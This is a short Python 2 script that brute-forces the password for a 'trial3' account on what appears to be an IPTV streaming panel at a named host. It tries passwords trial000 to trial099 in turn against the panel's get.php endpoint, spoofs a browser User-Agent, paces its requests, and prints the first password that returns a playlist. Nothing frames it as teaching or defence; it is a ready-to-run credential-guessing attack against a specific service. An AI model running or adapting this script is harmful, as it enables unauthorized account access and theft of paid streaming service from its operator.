import urllib2
import time

def get_response(url):
    req = urllib2.Request(url)
    req.add_header('User-Agent',
                   'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3')
    try:
        time.sleep(1)
        response = urllib2.urlopen(req)
        responsestr = response.read()
        response.close()
    except urllib2.HTTPError, err:
        if err.code == 404:
            responsestr = ""
    # response = urllib2.urlopen(req)

    return responsestr


def GetPwd():
    for num in range(0, 100):
        url = "http://tvdasogra.com:8880/get.php?username=trial3&password=trial" + str(num).zfill(
            3) + "&type=m3u&output=mpegts"
        
        link = get_response(url)
        print num
        if len(link) > 0:
            return "trial" + str(num).zfill(3)


print "password->" + GetPwd()
